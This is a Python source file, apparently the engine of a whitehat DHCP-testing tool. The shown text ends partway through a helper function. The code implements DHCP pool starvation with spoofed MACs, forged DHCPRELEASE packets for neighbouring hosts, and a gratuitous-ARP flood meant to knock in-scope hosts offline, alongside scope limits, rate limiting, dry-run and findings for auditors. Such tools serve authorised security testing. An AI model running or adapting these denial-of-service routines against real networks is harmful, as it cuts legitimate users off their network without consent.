"""DhcpEngine — orchestrates senders + sniffer over the pure packet layer.

Every outbound frame funnels through `_send()`, the single chokepoint that enforces the
whitehat guarantees (scope + rate limit + dry-run). `core` never prints; it emits events.
"""

from __future__ import annotations

import threading
import time

from scapy.all import sendp  # module-level so tests can monkeypatch dhcpig.core.engine.sendp

from . import events as ev
from . import packets
from .events import EventBus
from .exceptions import ConfigError
from .fingerprint import extract_signature, resolve
from .fingerprint import from_mac as fingerprint_from_mac
from .models import (
    FAIL,
    INCONCLUSIVE,
    INFO,
    PASS,
    ControlOutcome,
    Finding,
    HostFingerprint,
    Lease,
    Mode,
    Neighbor,
    ServerInfo,
    SessionConfig,
)
from .safety import Cleanup, RateLimiter, ScopeGuard
from .sniffer import DhcpSniffer

# engine states. EXHAUSTED means the *server* stopped offering — it is never set because of
# anything we chose ourselves (there is no lease cap; --rate is the only self-imposed bound).
IDLE, RUNNING, EXHAUSTED, STOPPING, DONE = "IDLE", "RUNNING", "EXHAUSTED", "STOPPING", "DONE"


class DhcpEngine:
    def __init__(self, cfg: SessionConfig, bus: EventBus) -> None:
        self.cfg = cfg
        self.bus = bus
        self.scope = ScopeGuard(cfg.scope_cidrs)
        self.rate = RateLimiter(cfg.rate_limit_pps)
        self.cleanup = Cleanup()
        self.state = IDLE
        self._stop = threading.Event()
        self._threads: list[threading.Thread] = []
        self._sniffer: DhcpSniffer | None = None
        self._started = 0.0
        # counters
        self.discovers = 0
        self.offers = 0
        self.acks = 0
        self.naks = 0
        self.garps = 0
        self.releases = 0
        self.servers: dict[str, ServerInfo] = {}
        # control transactions (legitimate cycle from the real NIC MAC), pre and post run
        self.control_pre: ControlOutcome | None = None  # real NIC MAC (reachability/renewal)
        self.control_post: ControlOutcome | None = None
        self.control_pre_new: ControlOutcome | None = None  # fresh MAC (can a NEW client join?)
        self.control_post_new: ControlOutcome | None = None
        self.findings: list[Finding] = []
        self._control_lock = threading.Lock()
        self._control_xid: int | None = None
        self._control_offer = None
        self._control_ack = None
        self._control_nak = False
        self._control_offer_evt = threading.Event()
        self._control_ack_evt = threading.Event()
        # exhaustion detection: offers must have flowed and then stopped
        self._offers_seen_any = False
        self._last_offer_ts = 0.0
        self._silence_noticed = False
        self._finishing = threading.Event()
        # heartbeat thread; deliberately NOT in _threads (callers treat that list as "work in
        # progress" and would never see a destructive run finish if a forever-thread were in it)
        self._ticker: threading.Thread | None = None
        # correlate ARP-discovered neighbors with DHCP-observed fingerprints by MAC, so the
        # Neighbors table shows OS/Device regardless of which signal (ARP vs DHCP) arrives first
        self._neighbors_by_mac: dict[str, Neighbor] = {}
        self._fp_by_mac: dict[str, HostFingerprint] = {}

    # ---------------------------------------------------------------- send chokepoint
    def _send(self, pkt, target_ip: str | None = None) -> bool:
        """Return True if the frame was sent (or would-be-sent under dry-run).

        Enforces scope (for targeted frames), rate limit, and dry-run in one place.
        """
        if target_ip is not None and not self.scope.allows(target_ip):
            self.bus.emit(ev.Skipped(ip=target_ip, reason="OUT OF SCOPE"))
            return False
        self.rate.acquire()
        if self.cfg.dry_run:
            return True  # build + account, but never touch the wire
        sendp(pkt, iface=self.cfg.interface, verbose=False)
        return True

    def _debug(self, message: str) -> None:
        self.bus.emit(ev.Debug(message=message))

    # ---------------------------------------------------------------- lifecycle
    def start(self) -> None:
        if self.cfg.mode is Mode.ACTIVE_SCAN and not self.cfg.scope_cidrs:
            raise ConfigError("active-scan requires --scope (the network range to sweep)")
        self._started = time.time()
        self.state = RUNNING
        c = self.cfg
        self._debug(
            f"start mode={c.mode.value} iface={c.interface} ipver={c.ip_version.value} "
            f"rate={c.rate_limit_pps}pps threads={c.threads} "
            f"dry_run={c.dry_run} spoof_eth_src={c.spoof_ethernet_src} "
            f"scope={c.scope_cidrs} restore_on_exit={c.restore_on_exit} control={c.control}"
        )
        if self.cfg.status_interval > 0:
            self._ticker = threading.Thread(
                target=self._status_ticker, name="dhcpig-status", daemon=True
            )
            self._ticker.start()
        runners = {
            Mode.EXHAUST: self._run_exhaust,
            Mode.SCAN: self._run_scan,
            Mode.ACTIVE_SCAN: self._run_active_scan,
            Mode.RELEASE_NEIGHBORS: self._run_release,
            Mode.GARP_DOS: self._run_garp,
        }
        runners[self.cfg.mode]()

    # ---------------------------------------------------------------- status heartbeat
    def _counters(self) -> dict:
        return {
            "discovers": self.discovers,
            "offers": self.offers,
            "leases": self.acks,
            "naks": self.naks,
            "releases": self.releases,
            "garps": self.garps,
        }

    def _status_ticker(self) -> None:
        """Emit a StatusTick every `status_interval` seconds until the run stops."""
        prev, prev_t = self._counters(), time.time()
        # Event.wait() returns True once _stop is set, so this doubles as the sleep and the exit
        while not self._stop.wait(self.cfg.status_interval):
            now = time.time()
            cur = self._counters()
            window = max(1e-6, now - prev_t)
            stats = {
                "state": self.state,
                "elapsed": round(now - self._started, 1) if self._started else 0.0,
                "window": round(window, 1),
                "servers": len(self.servers),
                "neighbors": len(self._neighbors_by_mac),
                **cur,
                **{f"d_{k}": cur[k] - prev[k] for k in cur},
                "discover_pps": round((cur["discovers"] - prev["discovers"]) / window, 1),
                "lease_pps": round((cur["leases"] - prev["leases"]) / window, 1),
                "since_last_offer": (
                    round(now - self._last_offer_ts, 1) if self._offers_seen_any else None
                ),
            }
            self.bus.emit(ev.StatusTick(stats=stats))
            prev, prev_t = cur, now

    def stop(self) -> None:
        if self.state == DONE:
            return  # idempotent: the CLI's finally-block and the web layer may both call this
        self.state = STOPPING
        self._stop.set()
        for t in self._threads:
            t.join(timeout=3.0)
        # Post-run control runs BEFORE restore, while our leases are still held — that is what
        # makes "a real client can't get an address" a meaningful measurement.
        if self.cfg.mode is Mode.EXHAUST and self.cfg.control and self._sniffer is not None:
            self.control_post = self._control_transaction("post", client="self")
            # the leg that actually answers "is the pool drained?" — needs a fresh address
            self.control_post_new = self._control_transaction("post", client="new")
            denied = self.control_post_new
            if denied.attempted and not denied.success and self.acks > 0:
                self.state = EXHAUSTED
                self.bus.emit(
                    ev.PoolExhausted(
                        leases=self.acks,
                        elapsed=time.time() - self._started,
                        confirmed=True,
                    )
                )
        self._finalize_findings()
        if self._sniffer is not None:
            self._sniffer.stop()
        if self.cfg.restore_on_exit and self.cfg.mode is Mode.EXHAUST:
            self.restore()
        self.state = DONE
        self.bus.emit(ev.SessionEnded(report=self.status()))

    def _finish_in_background(self, reason: str) -> None:
        """A terminal condition was reached — finalize without waiting for the operator.

        Runs off-thread because stop() joins the worker threads, and the caller here *is* one
        of them. Without this the run would sit idle after the pool drained: senders dead, no
        post-control, no verdict, until someone pressed Stop.
        """
        if self._finishing.is_set():
            return
        self._finishing.set()
        self._debug(f"auto-finalizing: {reason}")
        threading.Thread(target=self.stop, name="dhcpig-finish", daemon=True).start()

    def restore(self) -> None:
        """Release exactly the leases we acquired."""
        pending = self.cleanup.pending()
        if pending:
            self._debug(f"restore: releasing {len(pending)} acquired lease(s)")
        for lease in pending:
            pkt = packets.build_release_v4(lease.mac, lease.ip, lease.server_ip, lease.xid)
            self._send(pkt)  # releasing our own leases; not scope-gated
            lease.released = True
            self.releases += 1
            self.bus.emit(ev.LeaseReleased(lease=lease))

    def status(self) -> dict:
        return {
            "state": self.state,
            "discovers": self.discovers,
            "offers": self.offers,
            "leases": self.acks,
            "naks": self.naks,
            "garps": self.garps,
            "releases": self.releases,
            "servers": len(self.servers),
            "elapsed": round(time.time() - self._started, 1) if self._started else 0.0,
            "control_pre": self.control_pre.success if self.control_pre else None,
            "control_post": self.control_post.success if self.control_post else None,
            "findings": len(self.findings),
        }

    # ---------------------------------------------------------------- helpers
    def _src_mac(self, client_mac: str) -> str:
        if self.cfg.spoof_ethernet_src:
            return client_mac
        from scapy.all import get_if_hwaddr

        try:
            return get_if_hwaddr(self.cfg.interface)
        except Exception:
            # dry-run / no real iface: nothing is sent, so a placeholder src is fine
            from .netutils import random_mac

            return random_mac()

    # ---------------------------------------------------------------- control transaction
    def _consume_control(self, pkt) -> bool:
        """Route a reply belonging to the in-flight control transaction. True if consumed."""
        from scapy.all import BOOTP

        with self._control_lock:
            xid = self._control_xid
        if xid is None or BOOTP not in pkt or pkt[BOOTP].xid != xid:
            return False
        if packets.is_offer(pkt):
            self._control_offer = pkt
            self._control_offer_evt.set()
            return True
        if packets.is_ack(pkt):
            self._control_ack = pkt
            self._control_ack_evt.set()
            return True
        if packets.is_nak(pkt):
            self._control_nak = True
            self._control_offer_evt.set()
            self._control_ack_evt.set()
            return True
        return False

    def _fresh_control_mac(self) -> str:
        """A never-seen, locally administered MAC for the 'new client' control leg.

        Deliberately NOT the de:ad:* prefix the exhaust clients use, so a filter keyed on our
        attack traffic doesn't catch the control too.
        """
        import random

        return "02:" + ":".join(f"{random.randint(0, 255):02x}" for _ in range(5))

    def _control_transaction(self, phase: str, client: str = "self") -> ControlOutcome:
        """One legitimate DHCP cycle (DISCOVER/OFFER/REQUEST/ACK/RELEASE), released immediately.

        Two client identities, because they answer different questions:
          * `self` — this machine's real NIC MAC. The server most likely already has a binding
            for it, so this is effectively a RENEWAL: it proves DHCP is reachable and we are on
            the right VLAN, but it can succeed even when the free pool is completely drained.
          * `new` — a MAC the server has never seen, which must come off the free list. This is
            the only leg that can show whether a *new* client can still obtain an address.
        """
        out = ControlOutcome(phase=phase, client=client)
        if self.cfg.dry_run:
            out.reason = "skipped (dry-run)"
            self.bus.emit(ev.ControlFinished(outcome=out))
            return out
        from scapy.all import DHCP

        try:
            if client == "new":
                mac = self._fresh_control_mac()
            else:
                from scapy.all import get_if_hwaddr

                mac = get_if_hwaddr(self.cfg.interface)
        except Exception as exc:
            out.reason = f"skipped (no hardware MAC: {exc!r})"
            self.bus.emit(ev.ControlFinished(outcome=out))
            return out

        out.attempted = True
        out.mac = mac
        self.bus.emit(ev.ControlStarted(phase=phase))
        started = time.time()
        xid = _rand_xid()
        with self._control_lock:
            self._control_xid = xid
            self._control_offer = None
            self._control_ack = None
            self._control_nak = False
        self._control_offer_evt.clear()
        self._control_ack_evt.clear()
        try:
            self._send(packets.build_discover_v4(mac, xid, mac))
            who = "real NIC MAC" if client == "self" else "fresh unseen MAC"
            self._debug(f"CONTROL[{phase}/{client}] DISCOVER xid=0x{xid:08x} chaddr={mac} ({who})")
            if not self._control_offer_evt.wait(self.cfg.timeouts.control):
                out.reason = "no OFFER within timeout"
                return out
            if self._control_nak:
                out.reason = "server replied NAK"
                return out
            offer = self._control_offer
            sid, _, offered_ip, subnet = packets.parse_offer(offer)
            out.offered_ip, out.server_id, out.subnet = offered_ip, sid, subnet
            lt = packets.dhcp_option(offer[DHCP].options, "lease_time")
            out.lease_time = int(lt) if isinstance(lt, int) else None
            self._debug(f"CONTROL[{phase}/{client}] OFFER {offered_ip} from {sid} subnet={subnet}")
            self._send(packets.build_request_v4(offer, mac))
            if not self._control_ack_evt.wait(self.cfg.timeouts.control):
                out.reason = f"OFFER {offered_ip} but no ACK within timeout"
                return out
            if self._control_nak:
                out.reason = f"OFFER {offered_ip} then NAK"
                return out
            out.success = True
            self._debug(
                f"CONTROL[{phase}/{client}] ACK {offered_ip} — this client can obtain a lease"
            )
            # give the address straight back; the control must not consume pool capacity
            self._send(packets.build_release_v4(mac, offered_ip, sid, xid))
            self._debug(f"CONTROL[{phase}/{client}] RELEASE {offered_ip}")
        except Exception as exc:  # a broken control must never kill the run
            out.reason = f"error: {exc!r}"
        finally:
            out.elapsed = round(time.time() - started, 2)
            with self._control_lock:
                self._control_xid = None
            self.bus.emit(ev.ControlFinished(outcome=out))
        return out

    # ---------------------------------------------------------------- findings
    def _raise(self, finding: Finding) -> None:
        self.findings.append(finding)
        self.bus.emit(ev.FindingRaised(finding=finding))

    def _finalize_findings(self) -> None:
        """Turn what we observed into auditable verdicts. Called once, at stop()."""
        if self.cfg.dry_run:
            return
        pre, post = self.control_pre, self.control_post
        distinct_macs = len({ln.mac for ln in self.cleanup.all()})
        elapsed = round(time.time() - self._started, 1) if self._started else 0.0

        # A failed baseline invalidates everything else — say so first and loudly.
        if pre is not None and pre.attempted and not pre.success:
            self._raise(
                Finding(
                    id="CONTROL_BASELINE_FAILED",
                    title="Baseline DHCP request from the real NIC MAC failed",
                    verdict=INCONCLUSIVE,
                    severity="high",
                    evidence={
                        "phase": "pre",
                        "reason": pre.reason,
                        "interface": self.cfg.interface,
                    },
                    recommendation=(
                        "Results are not conclusive. Confirm the interface is on the intended "
                        "VLAN with a reachable DHCP server before drawing any conclusion about "
                        "the network's defenses."
                    ),
                )
            )

        baseline_ok = pre is not None and pre.success
        # A new client blocked at baseline while our own MAC works is the signature of an L2
        # admission control (snooping / port security), not a broken test.
        if (
            baseline_ok
            and self.control_pre_new is not None
            and self.control_pre_new.attempted
            and not self.control_pre_new.success
        ):
            self._raise(
                Finding(
                    id="NEW_CLIENT_BLOCKED_AT_BASELINE",
                    title="An unknown MAC could not obtain an address even before testing",
                    verdict=PASS,
                    severity="info",
                    evidence={
                        "known_mac_ok": True,
                        "new_client_reason": self.control_pre_new.reason,
                    },
                    recommendation=(
                        "This machine's own MAC was served but an unseen MAC was not — "
                        "consistent with DHCP snooping or port security. Exhaustion cannot be "
                        "measured against this segment, which is itself the desired outcome."
                    ),
                )
            )
        if self.cfg.mode is Mode.EXHAUST:
            if self.acks > 0:
                self._raise(
                    Finding(
                        id="DHCP_STARVATION_POSSIBLE",
                        title="Pool addresses obtained using spoofed client MACs",
                        verdict=FAIL,
                        severity="high",
                        evidence={
                            "leases": self.acks,
                            "distinct_client_macs": distinct_macs,
                            "spoofed_ethernet_src": self.cfg.spoof_ethernet_src,
                            "elapsed_sec": elapsed,
                            "servers": list(self.servers),
                        },
                        recommendation=(
                            "Enable DHCP snooping on the access switch and port security "
                            "(MAC limit) on this port, then re-run to confirm."
                        ),
                    )
                )
            elif baseline_ok and self.discovers > 0:
                self._raise(
                    Finding(
                        id="DHCP_STARVATION_BLOCKED",
                        title="Spoofed-MAC DHCP requests obtained no addresses",
                        verdict=PASS,
                        severity="info",
                        evidence={
                            "discovers": self.discovers,
                            "offers": self.offers,
                            "leases": 0,
                            "baseline_lease": pre.offered_ip if pre else None,
                            "elapsed_sec": elapsed,
                        },
                        recommendation=(
                            "Consistent with DHCP snooping and/or port security. The baseline "
                            "lease succeeded, so the segment does serve DHCP — the spoofed "
                            "requests specifically were denied."
                        ),
                    )
                )

            # Exhaustion is judged on the NEW-client leg. The self leg usually renews an
            # existing binding, so it can succeed against a completely drained pool.
            pre_new, post_new = self.control_pre_new, self.control_post_new
            new_baseline_ok = pre_new is not None and pre_new.success
            if post_new is not None and post_new.attempted:
                if not post_new.success and self.acks > 0 and new_baseline_ok:
                    self._raise(
                        Finding(
                            id="POOL_EXHAUSTED_CONFIRMED",
                            title="A new client was denied an address while ours were held",
                            verdict=FAIL,
                            severity="high",
                            evidence={
                                "leases_held": self.acks,
                                "new_client_reason": post_new.reason,
                                "new_client_baseline_ip": pre_new.offered_ip if pre_new else None,
                                "renewal_still_worked": bool(post and post.success),
                            },
                            recommendation=(
                                "The pool was drained to the point of denying service to new "
                                "clients. Rate-limit DHCP per port and enable snooping."
                            ),
                        )
                    )
                elif post_new.success:
                    self._raise(
                        Finding(
                            id="POOL_NOT_EXHAUSTED",
                            title="A new client could still obtain an address after the run",
                            verdict=INFO,
                            severity="info",
                            evidence={
                                "leases_held": self.acks,
                                "new_client_ip": post_new.offered_ip,
                                "offers_ceased": self.state == EXHAUSTED,
                            },
                            recommendation=(
                                "The pool was not drained. If offers stopped anyway, the server "
                                "stopped answering *us* — see SERVER_STOPPED_SERVING_TEST_CLIENTS."
                            ),
                        )
                    )
                    # offers stopped, yet a brand-new client is still served: that is the server
                    # refusing our traffic specifically, not running out of addresses
                    if self.state == EXHAUSTED:
                        self._raise(
                            Finding(
                                id="SERVER_STOPPED_SERVING_TEST_CLIENTS",
                                title="Server stopped answering the test clients while still "
                                "serving a new client",
                                verdict=INFO,
                                severity="medium",
                                evidence={
                                    "leases_before_offers_ceased": self.acks,
                                    "discovers": self.discovers,
                                    "naks": self.naks,
                                    "rate_pps": self.cfg.rate_limit_pps,
                                    "new_client_ip": post_new.offered_ip,
                                },
                                recommendation=(
                                    "Consistent with DHCP rate-limiting, offer-table saturation "
                                    "or anti-starvation protection rather than pool exhaustion. "
                                    "Re-run with a lower --rate to see whether allocation "
                                    "resumes; a NAK burst just before offers ceased points at "
                                    "the server re-offering already-pending addresses."
                                ),
                            )
                        )

        if self.naks > 0:
            self._raise(
                Finding(
                    id="DHCP_NAK_OBSERVED",
                    title="Server actively refused requests (DHCPNAK)",
                    verdict=INFO,
                    severity="medium",
                    evidence={"naks": self.naks},
                    recommendation=(
                        "NAKs often indicate snooping binding-table enforcement or an address "
                        "conflict. Correlate with switch logs."
                    ),
                )
            )

        if len(self.servers) > 1:
            self._raise(
                Finding(
                    id="MULTIPLE_DHCP_SERVERS",
                    title="More than one DHCP server answered on this segment",
                    verdict=FAIL,
                    severity="high",
                    evidence={"servers": list(self.servers)},
                    recommendation=(
                        "Verify each server is authorized. An unexpected responder is a rogue "
                        "DHCP server; DHCP snooping with trusted uplink ports prevents this."
                    ),
                )
            )

    def _note_neighbor(self, mac: str, ip: str) -> Neighbor:
        """Record/refresh a neighbor, attaching any DHCP fingerprint already seen for this MAC.

        With no DHCP evidence we fall back to the MAC's OUI, so an ARP-only host still shows
        its hardware vendor rather than an empty OS/Device column.
        """
        fp = self._fp_by_mac.get(mac)
        if fp is None:
            fp = fingerprint_from_mac(mac, ip=ip, role="neighbor")
        n = Neighbor(mac=mac, ip=ip, fingerprint=fp)
        self._neighbors_by_mac[mac] = n
        self.bus.emit(ev.NeighborFound(neighbor=n))
        return n

    def _note_fingerprint(self, fp: HostFingerprint) -> None:
        """Record a resolved fingerprint by MAC; if that host is already a known neighbor
        (ARP arrived before/without DHCP), refresh its row so the Neighbors table picks it up."""
        if fp.confidence <= 0 or not fp.mac:
            return
        self._fp_by_mac[fp.mac] = fp
        existing = self._neighbors_by_mac.get(fp.mac)
        if existing is not None and (
            existing.fingerprint is None or fp.confidence > existing.fingerprint.confidence
        ):
            updated = Neighbor(mac=existing.mac, ip=existing.ip, fingerprint=fp)
            self._neighbors_by_mac[fp.mac] = updated
            self.bus.emit(ev.NeighborFound(neighbor=updated))

    def _do_release(self, neighbors: list[Neighbor], server_ip: str) -> int:
        """Send DHCPRELEASE for in-scope neighbors. Returns count sent. Unit-testable."""
        sent = 0
        for n in neighbors:
            if self._stop.is_set():
                break
            xid = _rand_xid()
            pkt = packets.build_release_v4(n.mac, n.ip, server_ip, xid)
            if self._send(pkt, target_ip=n.ip):
                sent += 1
                self.releases += 1
                self.bus.emit(
                    ev.LeaseReleased(
                        lease=Lease(n.mac, n.ip, server_ip, xid, self.cfg.ip_version, released=True)
                    )
                )
        return sent

    def _do_garp(self, ips: list[str]) -> int:
        """Flood gratuitous ARP for in-scope IPs. Returns count sent. Unit-testable."""
        from .netutils import random_mac

        sent = 0
        for ip in ips:
            if self._stop.is_set():
                break
            pkt = packets.build_garp(ip, random_mac())
            if self._send(pkt, target_ip=ip):
                sent += 1
                self.garps += 1
                self.bus.emit(ev.GarpSent(ip=ip))
        return sent

    # ---------------------------------------------------------------- run loops
    def _run_exhaust(self) -> None:
        # dry-run is fully offline: no sniffer (no OFFERs would arrive), so it needs no root.
        if not self.cfg.dry_run:
            self._sniffer = DhcpSniffer(self.cfg.interface, self.cfg.ip_version, self._on_dhcp)
            self._sniffer.start()
            self._debug(f"sniffer started on {self.cfg.interface} (filter: dhcp/arp/icmp)")
            # Prelude (inventory + controls) runs off-thread so start() returns immediately and
            # the UI streams progress instead of blocking the HTTP request for ~10s.
            t = threading.Thread(target=self._exhaust_prelude, daemon=True)
            t.start()
            self._threads.append(t)
            return
        self._debug("dry-run: sniffer disabled (no packets sent or received)")
        self._start_senders()

    def _exhaust_prelude(self) -> None:
        """Baseline the segment, then hand off to the senders.

        Order matters: the ARP inventory records who was on the network *before* we touched it,
        and the controls establish what a normal client could do beforehand. Without those
        baselines a null result at the end can't be interpreted.
        """
        if self.cfg.arp_sweep:
            self._baseline_arp_scan()
        if self.cfg.control and not self._stop.is_set():
            self.control_pre = self._control_transaction("pre", client="self")
            self.control_pre_new = self._control_transaction("pre", client="new")
        if not self._stop.is_set():
            self._start_senders()

    def _baseline_arp_scan(self) -> None:
        """ARP-sweep the segment for a pre-run inventory of live hosts."""
        cidrs = self._sweep_cidrs()
        if not cidrs:
            self._debug("arp sweep skipped: could not determine a network range for the interface")
            return
        self._debug(f"arp sweep starting over {', '.join(cidrs)} (pre-run inventory)")
        found, _ = self._discover_neighbors(cidrs)
        self._debug(f"arp sweep: {len(found)} host(s) present before exhausting")

    def _sweep_cidrs(self) -> list[str]:
        """Range for the *non-destructive* baseline sweep: explicit scope, else the iface network.

        Destructive modes never use this — they stay pinned to cfg.scope_cidrs so their blast
        radius can't be widened by an inferred range.
        """
        if self.cfg.scope_cidrs:
            return list(self.cfg.scope_cidrs)
        from .netutils import iface_network_cidr

        cidr = iface_network_cidr(self.cfg.interface)
        return [cidr] if cidr else []

    def _start_senders(self) -> None:
        for _ in range(max(1, self.cfg.threads)):
            t = threading.Thread(target=self._exhaust_sender, daemon=True)
            t.start()
            self._threads.append(t)

    def _exhaust_sender(self) -> None:
        from .netutils import random_mac

        macs = list(self.cfg.client_macs) if self.cfg.client_macs else None
        while not self._stop.is_set():
            # Offers flowed and then stopped: the pool *looks* drained. Provisional until the
            # post-run control transaction confirms a real client is also denied — which we now
            # go and do ourselves rather than waiting for the operator to press Stop.
            silence = time.time() - self._last_offer_ts
            if self._offers_seen_any and silence > self.cfg.timeouts.offer_silence:
                if self.state != EXHAUSTED:
                    self.state = EXHAUSTED
                    self.bus.emit(
                        ev.PoolExhausted(
                            leases=self.acks,
                            elapsed=time.time() - self._started,
                            confirmed=False,
                        )
                    )
                    self._finish_in_background(
                        f"no OFFER for {silence:.0f}s after {self.acks} lease(s)"
                    )
                return
            if self._offers_seen_any and silence > 2.0 and not self._silence_noticed:
                self._silence_noticed = True
                self.bus.emit(
                    ev.OffersCeased(
                        quiet_for=silence,
                        leases=self.acks,
                        deadline=self.cfg.timeouts.offer_silence,
                    )
                )
            mac = macs.pop(0) if macs else random_mac()
            if macs is not None:
                macs.append(mac)  # rotate through the provided list
            xid = _rand_xid()
            src = self._src_mac(mac)
            pkt = packets.build_discover_v4(mac, xid, src)
            self._send(pkt)
            self.discovers += 1
            self.bus.emit(ev.DiscoverSent(mac=mac))
            self._debug(f"DISCOVER xid=0x{xid:08x} chaddr={mac} eth_src={src} flags=0x8000")
            # No extra sleep here: RateLimiter.acquire() inside _send() is the single pacing
            # mechanism, so --rate is authoritative.

    def _on_dhcp(self, pkt) -> None:
        try:
            if self._consume_control(pkt):  # belongs to the in-flight control transaction
                return
            if packets.is_offer(pkt):
                self._handle_offer(pkt)
            elif packets.is_ack(pkt):
                self._handle_ack(pkt)
            elif packets.is_nak(pkt):
                self._handle_nak(pkt)
        except Exception as exc:  # never let a bad packet kill the sniffer thread
            self.bus.emit(ev.ErrorEvent(message=f"parse error: {exc!r}"))

    def _handle_offer(self, pkt) -> None:
        from scapy.all import BOOTP

        self.offers += 1
        self._offers_seen_any = True
        self._last_offer_ts = time.time()
        self._silence_noticed = False  # offers resumed; re-arm the quiet-period notice
        server_id, server_mac, offered_ip, subnet = packets.parse_offer(pkt)
        server = self.servers.get(server_id)
        if server is None:
            server = ServerInfo(server_id, server_mac, subnet, self.cfg.ip_version)
            fp = resolve(extract_signature(pkt, role="server"), role="server")
            fp.ip = server_id
            server.fingerprint = fp
            self.servers[server_id] = server
            self.bus.emit(ev.ServerDiscovered(server=server))
        server.offers_seen += 1
        lease = Lease(
            packets.client_mac_from_offer(pkt),
            offered_ip,
            server_id,
            pkt[BOOTP].xid,
            self.cfg.ip_version,
        )
        self.bus.emit(ev.OfferReceived(lease=lease, server=server))
        self._debug(
            f"OFFER xid=0x{pkt[BOOTP].xid:08x} yiaddr={offered_ip} server_id={server_id} "
            f"siaddr={pkt[BOOTP].siaddr} subnet={subnet} "
            f"chaddr={lease.mac} opts=[{_opts_summary(pkt)}]"
        )
        req = packets.build_request_v4(pkt, self._src_mac(lease.mac))
        self._send(req)
        self.bus.emit(ev.RequestSent(lease=lease))
        self._debug(
            f"REQUEST xid=0x{pkt[BOOTP].xid:08x} requested_addr={offered_ip} server_id={server_id}"
        )

    def _handle_ack(self, pkt) -> None:
        from scapy.all import BOOTP

        mac = packets.client_mac_from_offer(pkt)
        server_id, _, ip, _ = packets.parse_offer(pkt)
        lease = Lease(
            mac, ip, server_id, pkt[BOOTP].xid, self.cfg.ip_version, acquired_at=time.time()
        )
        self.cleanup.register(lease)
        self.acks += 1
        self.bus.emit(ev.AckReceived(lease=lease))
        self._debug(
            f"ACK xid=0x{pkt[BOOTP].xid:08x} yiaddr={ip} server_id={server_id} "
            f"chaddr={mac} lease#{self.acks} opts=[{_opts_summary(pkt)}]"
        )

    def _handle_nak(self, pkt) -> None:
        """DHCPNAK: the server refused. Meaningful evidence, previously dropped on the floor."""
        from scapy.all import BOOTP, DHCP

        self.naks += 1
        server_id = packets.server_identifier(pkt[BOOTP].siaddr, pkt[DHCP].options)
        self.bus.emit(ev.NakReceived(server_ip=server_id))
        self._debug(f"NAK xid=0x{pkt[BOOTP].xid:08x} from {server_id} opts=[{_opts_summary(pkt)}]")

    def _run_scan(self) -> None:
        # read-only: sniff + fingerprint. No DHCP REQUEST/RELEASE, no GARP.
        self._sniffer = DhcpSniffer(self.cfg.interface, self.cfg.ip_version, self._on_scan)
        self._sniffer.start()

    def _on_scan(self, pkt) -> None:
        from scapy.all import ARP, DHCP, Ether

        try:
            if DHCP in pkt:
                role = "server" if packets.is_offer(pkt) or packets.is_ack(pkt) else "client"
                sig = extract_signature(pkt, role=role)
                fp = resolve(sig, role=role)
                if role == "client":
                    self._note_fingerprint(fp)  # may refresh an already-known neighbor row
                self.bus.emit(ev.HostFingerprinted(fp=fp))
                self._debug(
                    f"{role} {fp.mac} prl={sig.prl} vendor_class={sig.vendor_class!r} "
                    f"-> {fp.os or fp.device or '?'} ({fp.confidence}% via {fp.matched_via})"
                )
            elif ARP in pkt and pkt[ARP].op == 2:  # is-at
                self._note_neighbor(pkt[Ether].src, pkt[ARP].psrc)
        except Exception as exc:
            self.bus.emit(ev.ErrorEvent(message=f"scan parse error: {exc!r}"))

    def _run_active_scan(self) -> None:
        # active but non-destructive: ARP sweep + DHCP INFORM. Sniffer catches replies.
        if not self.cfg.dry_run:
            self._sniffer = DhcpSniffer(self.cfg.interface, self.cfg.ip_version, self._on_scan)
            self._sniffer.start()
            self._debug(f"active-scan sniffer started on {self.cfg.interface}")
        t = threading.Thread(target=self._active_scan_worker, daemon=True)
        t.start()
        self._threads.append(t)

    def _active_scan_worker(self) -> None:
        from .netutils import get_if_ip, random_mac

        neighbors, _ = self._discover_neighbors()  # benign ARP who-has across scope
        self._debug(f"active-scan: {len(neighbors)} host(s) responded to ARP")
        # Actively probe/fingerprint the DHCP server(s) with a single INFORM from our address.
        my_ip = get_if_ip(self.cfg.interface)
        if not my_ip or self.cfg.dry_run:
            my_ip = my_ip or "0.0.0.0"
        try:
            from scapy.all import get_if_hwaddr

            my_mac = get_if_hwaddr(self.cfg.interface)
        except Exception:
            my_mac = random_mac()
        xid = _rand_xid()
        inform = packets.build_inform_v4(my_mac, my_ip, xid, self.cfg.request_options)
        self._send(inform)
        self._debug(f"active-scan: sent DHCP INFORM ciaddr={my_ip} xid=0x{xid:08x}")
        # keep the sniffer collecting replies until stopped
        self._stop.wait()

    def _run_release(self) -> None:
        # discovery + release runs in a worker so start() returns promptly
        t = threading.Thread(target=self._release_worker, daemon=True)
        t.start()
        self._threads.append(t)

    def _release_worker(self) -> None:
        # no scope given -> fall back to the interface's own network
        neighbors, server_ip = self._discover_neighbors(self._sweep_cidrs())
        self._debug(f"release: {len(neighbors)} neighbor(s) discovered in scope")
        self._do_release(neighbors, server_ip or "0.0.0.0")

    def _run_garp(self) -> None:
        t = threading.Thread(target=self._garp_worker, daemon=True)
        t.start()
        self._threads.append(t)

    def _garp_worker(self) -> None:
        # standalone: no exhaustion phase. No scope given -> the interface's own network.
        neighbors, _ = self._discover_neighbors(self._sweep_cidrs())
        self._debug(f"garp: {len(neighbors)} in-scope host(s) to knock offline")
        self._do_garp([n.ip for n in neighbors])

    def _discover_neighbors(
        self, cidrs: list[str] | None = None
    ) -> tuple[list[Neighbor], str | None]:
        """ARP-sweep for live neighbors (best effort; needs a real iface).

        `cidrs` defaults to cfg.scope_cidrs. Destructive callers MUST leave it unset so their
        targets stay pinned to the authorised scope.
        """
        import ipaddress

        from scapy.all import ARP, Ether, srp

        from .netutils import get_if_ip

        found: dict[str, Neighbor] = {}
        src_ip = get_if_ip(self.cfg.interface) or "0.0.0.0"
        targets: list[str] = []
        for cidr in (cidrs if cidrs is not None else self.cfg.scope_cidrs) or []:
            net = ipaddress.ip_network(cidr, strict=False)
            targets += [str(h) for h in list(net.hosts())[:1024]]
        if not targets or self.cfg.dry_run:
            return list(found.values()), None
        try:
            ans, _ = srp(
                Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=targets, psrc=src_ip),
                timeout=2,
                iface=self.cfg.interface,
                verbose=False,
            )
            for _, r in ans:
                found[r.psrc] = self._note_neighbor(r.hwsrc, r.psrc)
        except Exception as exc:
            self.bus.emit(ev.ErrorEvent(message=f"arp sweep error: {exc!r}"))
        return list(found.values()), None


def _rand_xid() -> int:
    import random

    return random.randint(1, 900000000)


def _opts_summary(pkt) -> str:
    """Compact 'name=value' dump of DHCP options for debug logging (skips pad/end)."""
    from scapy.all import DHCP

